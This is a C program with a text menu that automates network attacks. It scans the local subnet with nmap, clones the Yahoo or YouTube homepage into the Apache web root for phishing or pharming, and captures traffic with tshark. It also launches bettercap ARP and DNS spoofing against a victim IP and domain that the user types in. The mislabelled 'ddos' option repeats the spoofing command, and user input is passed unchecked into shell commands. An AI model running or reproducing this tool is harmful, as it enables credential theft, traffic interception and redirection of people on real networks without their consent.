#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int args)
{

	int option=0,option2=0,frame=0;
	char command2[100];
	printf("Enter the option from selected choice\n");
	printf("1. For checking the devices connected to you system.\n");
	printf("2. TO check your domain ip.\n");
	printf("3. set up YAHOO Pharming attack\n");
	printf("4. Start phshing attack\n");
	printf("5. Stop Physhing attack\n");
	printf("6. set up YOUTUBE Pharming attack\n");
	printf("7. PACKET CAPTURE COMMAND\n");
	printf("8: Launch dns spoof\n");
	printf("9: View captured packets");
	scanf("%d",&option);
	
	
	
	
	
	if(option==1)
	{
		
		system("nmap -sn 192.168.100.1/24");
	}
	else if(option == 2)
	{
		system("ifconfig");
	}
	else if(option == 3)
	{
		//system("service apache2 start");
		system("cd /var; mkdir www; cd www; mkdir html; cd html; rm -f index.html; ls; wget http://yahoo.com ;dir");
		
		//system("cd .. cd .. cd .. cd .. cd .. cd .. cd . ls");

	}
	else if(option==4)
	{
		system("service apache2 start");
		printf("APACHE STARTED");
		
		
		
	}
	else if(option == 5)
	{
		system("service apache2 stop");
		printf("APACHE STOPED");
	}
	else if(option == 6)
	{
		system("cd /var; mkdir www; cd www; mkdir html; cd html; rm -f index.html ; wget http://youtube.com ;");
	}
	else if(option ==7)
	{
		printf("Packet capture started. \nRun program in seperate window now\nPress ctrl+c to stop capture");
		system("tshark -i eth0 -w info.pcap");

	}
	else if(option == 9){
		system("tshark -r info.pcap http");
		printf("1. View packets with details");
		printf("2. View details of specific packet");
		scanf("%d",&option2);
		if(option2==1){
			system("tshark -r info.pcap -V");
		}
		else if(option2==2){
			printf("Enter frame number of packet:");
			scanf("%d",&frame);
			sprintf(command2,"tshark -r info.pcap -Y 'frame.number==%d' -V",frame);
			system(command2);
			
		}
	}
	else if(option == 8)
	{
		
		// Assuming IPv4 address
    
		//printf("Enter the target IP address: ");
    		//scan
    				char command[200];
    		char ip_address[16]; // Assuming IPv4 address
    		char attack[100];
		printf("Enter the target IP address: ");
    		scanf("%15s", ip_address);
    
    		printf("\n enter the website ");
    		scanf("%99s", attack);
    	
		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s;dns.spoof on;net.sniff on'", ip_address, attack);

    
    		system(command);

    
    		//system(command);
    

	}
	else if(option==10){
		printf("SHHHHHHH lets launch ddos attack...");
		char command[200];
    		char ip_address[16]; // Assuming IPv4 address
    		char attack[100];
		printf("Enter the target IP address: ");
    		scanf("%15s", ip_address);
    
    		printf("\n enter the website ");
    		scanf("%99s", attack);
    	
		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s; dns.spoof on;set net.sniff on,set apr.spoof on'", ip_address, attack);

    
    		system(command);
	}
}
